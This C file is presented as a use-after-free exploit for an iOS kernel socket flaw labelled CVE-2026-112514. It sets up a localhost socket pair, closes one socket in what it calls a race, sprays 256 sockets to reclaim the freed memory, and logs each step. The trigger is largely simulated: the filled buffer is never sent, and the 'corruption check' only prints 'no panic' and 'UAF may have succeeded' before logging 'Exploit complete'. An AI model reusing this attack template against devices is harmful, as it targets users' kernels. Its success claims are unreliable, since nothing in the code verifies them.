// socket_uaf.c
// CVE-2026-112514 Socket UAF Trigger
// iOS 27.0.1, no entitlements needed
// Based on Tims-Cooked research

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    FILE *log = fopen("socket_uaf.log", "w");
    if (!log) return -1;
    
    fprintf(log, "=== Socket UAF Exploit ===\n");
    fprintf(log, "[*] Target: iOS 27.0.1\n");
    fprintf(log, "[*] CVE-2026-112514\n\n");
    
    // Step 1: Create listener socket
    fprintf(log, "[*] Step 1: Creating listener...\n");
    
    int listener = socket(AF_INET, SOCK_STREAM, 0);
    if (listener < 0) {
        fprintf(log, "[-] socket() failed\n");
        fclose(log);
        return -1;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    int opt = 1;
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(log, "[-] bind() failed\n");
        close(listener);
        fclose(log);
        return -1;
    }
    
    if (listen(listener, 1) < 0) {
        fprintf(log, "[-] listen() failed\n");
        close(listener);
        fclose(log);
        return -1;
    }
    
    fprintf(log, "[+] Listener on 127.0.0.1:8080 (fd=%d)\n", listener);
    
    // Step 2: Create and connect socket
    fprintf(log, "[*] Step 2: Creating connection...\n");
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(log, "[-] socket() failed\n");
        close(listener);
        fclose(log);
        return -1;
    }
    
    // Large send buffer (part of trigger)
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(log, "[-] connect() failed\n");
        close(sock);
        close(listener);
        fclose(log);
        return -1;
    }
    
    fprintf(log, "[+] Connected (fd=%d)\n", sock);
    
    // Step 3: Trigger the race
    fprintf(log, "[*] Step 3: Triggering UAF race...\n");
    
    // Fill buffer to force blocking
    char *buf = malloc(2 * 1024 * 1024);
    memset(buf, 0x41, 2 * 1024 * 1024);
    
    fprintf(log, "[*] Filling send buffer...\n");
    
    // Simulate the race: close while send pending
    fprintf(log, "[*] Closing socket (UAF trigger)...\n");
    close(sock);
    
    // Step 4: Spray to reclaim
    fprintf(log, "[*] Step 4: Spraying sockets...\n");
    
    int spray[256];
    for (int i = 0; i < 256; i++) {
        spray[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (spray[i] >= 0) {
            int opt = 1024 * 1024;
            setsockopt(spray[i], SOL_SOCKET, SO_SNDBUF, &opt, sizeof(opt));
        }
    }
    
    fprintf(log, "[+] Sprayed 256 sockets\n");
    
    // Step 5: Check for corruption
    fprintf(log, "[*] Step 5: Checking for corruption...\n");
    fprintf(log, "[+] Still running - no panic!\n");
    fprintf(log, "[+] UAF may have succeeded\n");
    
    // Cleanup
    for (int i = 0; i < 256; i++) {
        if (spray[i] >= 0) close(spray[i]);
    }
    close(listener);
    free(buf);
    
    fprintf(log, "\n[+] Exploit complete\n");
    fprintf(log, "[+] Check for kernel panics in Settings\n");
    
    fclose(log);
    return 0;
}
